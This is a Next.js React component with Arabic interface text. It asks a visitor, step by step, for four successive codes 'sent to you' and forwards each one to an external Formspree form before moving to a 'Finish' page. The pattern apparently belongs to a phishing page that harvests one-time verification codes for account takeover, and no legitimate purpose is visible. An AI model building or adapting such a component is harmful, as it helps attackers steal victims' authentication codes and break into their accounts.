"use client";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { useForm } from "@formspree/react";

function EnterCode({ id }) {
  const [state, handleSubmit] = useForm("xjkbqzbo");
  const [message, setMessage] = useState("");
  const router = useRouter();
  const [formData, setFormData] = useState({
    id: id || "",
  });

  const onFormSubmit = async (e) => {
    e.preventDefault();

    const res = await handleSubmit({
      data: {
        code1: formData.code1,
      },
    });
    if (res && res.errors) {
      console.error("Error submitting form:", res.errors);
      alert("There was an error submitting the form.");
      return; // Prevent routing on error
    }

    switch (id) {
      case "code1":
        router.replace("/code2");
        break;
      case "code2":
        router.replace("/code3");
        break;
      case "code3":
        router.replace("/code4");
        break;
      case "code4":
        router.replace("/Finish");
        break;
      default:
        break;
    }
  };

  return (
    <div>
      <p className="text-xl text-stone-500 my-3">
        يرجى انتظار وادخال الكود الاخر المرسل إليك :
      </p>
      <form method="POST" onSubmit={onFormSubmit}>
        <input
          type="text"
          name="code"
          value={formData.code1}
          onChange={(e) => setFormData({ ...formData, code1: e.target.value })}
          placeholder="مثال : 234152"
          className="w-[300px] lg:w-[400px] rounded-2xl  outline-none border-2 py-2 mx-5 px-5 my-10 focus:border-stone-500"
        />
        <div className="w-full flex justify-center">
          <button
            type="submit"
            className="bg-red-600 text-white py-2 px-8 rounded-full mt-10"
          >
            التالي
          </button>
        </div>
      </form>
    </div>
  );
}

export default EnterCode;
